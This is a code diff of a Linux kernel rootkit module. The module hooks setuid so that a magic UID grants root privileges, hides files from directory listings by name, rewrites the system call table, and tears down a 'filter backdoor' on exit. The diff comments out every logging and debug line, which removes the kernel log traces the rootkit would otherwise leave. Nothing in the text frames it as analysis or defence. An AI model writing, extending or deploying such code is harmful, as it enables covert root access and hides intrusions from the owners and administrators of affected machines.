@@ -6,11 +6,11 @@ asmlinkage long hacked_setuid(uid_t uid)
 {
     long ret = 0;
     struct cred *new;
-    printk(KERN_INFO "intercepted setuid: %d\n", uid);
+    // printk(KERN_INFO "intercepted setuid: %d\n", uid);
 
     //if the requested uid is the "magic number" to give root priv
     if (uid == MAGIC_NUMBER) {
-        DEBUG("Magic Number passed in, elevating privilege");
+        // DEBUG("Magic Number passed in, elevating privilege");
         new = prepare_creds();
         if (!new)
             return -ENOMEM;
@@ -153,7 +153,7 @@ long handle_ls(struct linux_dirent *dirp, long length)
             // Hidden file is found
             if(strstr(cur_dirent->d_name, HIDDEN_FILES[i]) != NULL)
             {
-                printk("HIDDEN FILE: %s\n", cur_dirent->d_name);
+	        // printk("HIDDEN FILE: %s\n", cur_dirent->d_name);
                 isHidden = true;
                 break;
             }
@@ -608,7 +608,7 @@ static int __init initModule(void)
 
     set_addr_ro((unsigned long) sys_call_table);
 
-    DEBUG("loaded module");
+    // DEBUG("loaded module");
     // Non-zero return means that the module couldn't be loaded.
     return 0;
 }
@@ -630,7 +630,7 @@ static void __exit exitModule(void)
     exit_filter_backdoor();
 
     set_addr_ro((unsigned long) sys_call_table);
-    DEBUG("exiting module");
+    // DEBUG("exiting module");
 }
 
 module_init(initModule);
